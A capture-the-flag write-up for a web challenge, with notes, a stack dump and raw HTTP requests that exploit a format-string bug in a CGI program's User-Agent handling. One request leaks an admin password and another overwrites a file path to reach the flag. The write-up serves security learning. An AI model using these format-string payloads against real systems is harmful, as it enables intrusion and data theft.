# Braggard
> This guy keeps bragging about keeping us out of his secrets.
> It's annoying.
> Get the flag please.
> https://nessus-braggart.chals.io


## Findings
- Pass the `X-Debug: 1` header to get to debug page
- Setting `User-Agent` to a 2040 byte value is fine. But past that starts
  crashing from futzing with a stack canary
  Past 1008 we can modify the format string param. 
  - We can leak at least half of the stack canary with this.
    It also leaks the HTTP content
  - Can we write to the admin flag? Is the stack location fixed?
    - Anywhere else interesting to write to?
  Can we leak admin pass through this?

## Notes
- We can probably also put `X-Password: ourpass`

Stack in main:
```
ptr to debug
ptr to admin pass
ptr to user pass
72 bytes of content
stack canary

0x7fffae354050: 0x00007fffae3547f4      0x00007fffae354800
0x7fffae354060: 0x00007fffae354815      0x00007fffae354fc4
0x7fffae354070: 0x5858585858585858      0x5858585858585858
0x7fffae354080: 0x5858585858585858      0x5858585858585858
0x7fffae354090: 0x5858585858585858      0x5858585858585858
0x7fffae3540a0: 0x5858585858585858      0x0000585858585858
0x7fffae3540b0: 0x0000000000000000      0xd060720219400d00
```

## Leak admin password
```
GET https://nessus-braggart.chals.io/sec.cgi HTTP/1.1
host: nessus-braggart.chals.io
User-Agent: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC%275$s
X-Debug: 1
content-length: 0

<TITLE>Secrets</TITLE>
<pre><h1>debug info</h1><h3> Remote Addr : </h3>10.1.165.197<h3> User Agent : </h3>xbYP3h7Ua94c</pre><br><hr><br><H3>Ah Ah Ah, you didn't say the magic word.</H3>
<br><br><a href='sec.bak'>backup</a>

ADMIN PASSWORD: xbYP3h7Ua94c
```

Next we get the secrets:
```
GET https://nessus-braggart.chals.io/sec.cgi HTTP/1.1
host: nessus-braggart.chals.io
User-Agent: whatev
X-Debug: 1
X-Password: xbYP3h7Ua94c
content-length: 0

<TITLE>Secrets</TITLE>
<pre><h1>debug info</h1><h3> Remote Addr : </h3>10.1.165.197<h3> User Agent : </h3>whatev</pre><br><hr><br><pre><h3> secrets : </h3>
The secret is that the flag is in /home/ctf/flag, not here. You'll never get my secrets because I'm wicked smart.
</pre>
```

Now we get the flag
```
GET https://nessus-braggart.chals.io/sec.cgi HTTP/1.1
host: nessus-braggart.chals.io
User-Agent: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC%27750x%267$hn
X-Debug: 1
X-Password: xbYP3h7Ua94c
content-length: 0
```

We abuse the fact that brag is very close to flag. and just change the br to fl

Notes to actually read flag:
1. The print secrets calls the vulnerable printDebug function (BEFORE strcat)
2. We can probably use that somehow to modify the path that it opens
   to read /home/ctf/flag
3. That variables are on the heap.
4. Print i


